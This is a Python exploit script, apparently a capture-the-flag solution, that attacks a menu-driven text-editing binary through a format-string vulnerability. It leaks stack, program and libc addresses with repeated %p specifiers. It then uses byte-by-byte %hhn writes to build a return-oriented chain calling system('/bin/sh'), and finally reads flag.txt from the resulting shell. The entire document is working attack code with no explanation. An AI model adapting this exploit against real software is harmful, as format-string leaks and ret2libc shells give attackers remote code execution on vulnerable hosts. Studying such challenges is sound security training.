#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)


def cmd(choice):
    ru(b"> ")
    sl(i2b(choice))


def save():
    cmd(2)
    ru(b"Saved the current text!\n")


def edit(data, with_save=True):
    cmd(1)
    ru(b"Enter new text: ")
    s(data)
    ru(b"Done!\n")
    if with_save == True:
        save()
        trigger()


def trigger():
    cmd(114)


# guess_bit0 = int(input("[DEBUG] input guess bit: "), 16)
guess_bit0 = 0x8

payload = b"%p." * 0x10
payload = payload.ljust(0x100, b"\x00")

payload += p16((guess_bit0 << 12) | 0x20)
edit(payload)
# trigger()

temp = ru(b".", drop=True)
temp = ru(b".", drop=True)
temp = ru(b".", drop=True)
temp = ru(b".", drop=True)
temp = ru(b".", drop=True)

temp = ru(b".", drop=True)
stack_base = int(temp, 16) - 0x110
lg("stack_base", stack_base)

temp = ru(b".", drop=True)
elf_base = int(temp, 16) - 0x1406
lg("elf_base", elf_base)

payload = b"%12$s."
payload = payload.ljust(0x10, b"\x00")
payload += p64(elf_base + 0x4140)
edit(payload)

temp = ru(b".", drop=True)
libc_base = u64_ex(temp) - 0x21A780
lg("libc_base", libc_base)
pop_rdi_ret = 0x000000000002A3E5 + libc_base

current_n = 0


def generate_hhn_payload(distance, hhn_data):
    global current_n
    offset = (distance // 8) + 6
    if hhn_data > current_n:
        temp = hhn_data - current_n
    elif hhn_data < current_n:
        temp = 0x100 - current_n + hhn_data
    elif hhn_data == current_n:
        return b"%" + i2b(offset) + b"hhn"
    current_n = hhn_data
    return b"%" + i2b(temp) + b"c%" + i2b(offset) + b"$hhn"


stack_buf = stack_base + 0x118
ret_addr = pop_rdi_ret + 1
current_n = 0
payload = generate_hhn_payload(0xC0 + 0x20, ((ret_addr) & 0xFF))
payload += generate_hhn_payload(0xC8 + 0x20, ((ret_addr >> 8) & 0xFF))
payload += generate_hhn_payload(0xD0 + 0x20, ((ret_addr >> 16) & 0xFF))
payload += generate_hhn_payload(0xD8 + 0x20, ((ret_addr >> 24) & 0xFF))
payload += generate_hhn_payload(0xE0 + 0x20, ((ret_addr >> 32) & 0xFF))
payload += generate_hhn_payload(0xE8 + 0x20, ((ret_addr >> 40) & 0xFF))
payload = payload.ljust(0xC0, b"\x00")
payload += p64(stack_buf + 0)
payload += p64(stack_buf + 1)
payload += p64(stack_buf + 2)
payload += p64(stack_buf + 3)
payload += p64(stack_buf + 4)
payload += p64(stack_buf + 5)
edit(payload)


stack_buf = stack_base + 0x118 + 8
current_n = 0
payload = generate_hhn_payload(0xC0 + 0x20, ((pop_rdi_ret) & 0xFF))
payload += generate_hhn_payload(0xC8 + 0x20, ((pop_rdi_ret >> 8) & 0xFF))
payload += generate_hhn_payload(0xD0 + 0x20, ((pop_rdi_ret >> 16) & 0xFF))
payload += generate_hhn_payload(0xD8 + 0x20, ((pop_rdi_ret >> 24) & 0xFF))
payload += generate_hhn_payload(0xE0 + 0x20, ((pop_rdi_ret >> 32) & 0xFF))
payload += generate_hhn_payload(0xE8 + 0x20, ((pop_rdi_ret >> 40) & 0xFF))
payload = payload.ljust(0xC0, b"\x00")
payload += p64(stack_buf + 0)
payload += p64(stack_buf + 1)
payload += p64(stack_buf + 2)
payload += p64(stack_buf + 3)
payload += p64(stack_buf + 4)
payload += p64(stack_buf + 5)
edit(payload)

binsh_addr = libc_base + next(libc.search(b"/bin/sh"))
current_n = 0
payload = generate_hhn_payload(0xC0 + 0x20, ((binsh_addr) & 0xFF))
payload += generate_hhn_payload(0xC8 + 0x20, ((binsh_addr >> 8) & 0xFF))
payload += generate_hhn_payload(0xD0 + 0x20, ((binsh_addr >> 16) & 0xFF))
payload += generate_hhn_payload(0xD8 + 0x20, ((binsh_addr >> 24) & 0xFF))
payload += generate_hhn_payload(0xE0 + 0x20, ((binsh_addr >> 32) & 0xFF))
payload += generate_hhn_payload(0xE8 + 0x20, ((binsh_addr >> 40) & 0xFF))
payload = payload.ljust(0xC0, b"\x00")
payload += p64(stack_buf + 0 + 8)
payload += p64(stack_buf + 1 + 8)
payload += p64(stack_buf + 2 + 8)
payload += p64(stack_buf + 3 + 8)
payload += p64(stack_buf + 4 + 8)
payload += p64(stack_buf + 5 + 8)
edit(payload)

system_addr = libc_base + libc.sym.system
current_n = 0
payload = generate_hhn_payload(0xC0 + 0x20, ((system_addr) & 0xFF))
payload += generate_hhn_payload(0xC8 + 0x20, ((system_addr >> 8) & 0xFF))
payload += generate_hhn_payload(0xD0 + 0x20, ((system_addr >> 16) & 0xFF))
payload += generate_hhn_payload(0xD8 + 0x20, ((system_addr >> 24) & 0xFF))
payload += generate_hhn_payload(0xE0 + 0x20, ((system_addr >> 32) & 0xFF))
payload += generate_hhn_payload(0xE8 + 0x20, ((system_addr >> 40) & 0xFF))
payload = payload.ljust(0xC0, b"\x00")
payload += p64(stack_buf + 0 + 8 + 8)
payload += p64(stack_buf + 1 + 8 + 8)
payload += p64(stack_buf + 2 + 8 + 8)
payload += p64(stack_buf + 3 + 8 + 8)
payload += p64(stack_buf + 4 + 8 + 8)
payload += p64(stack_buf + 5 + 8 + 8)
edit(payload)

cmd(3)

import time

time.sleep(1)
sl("cat flag.txt")

ia()
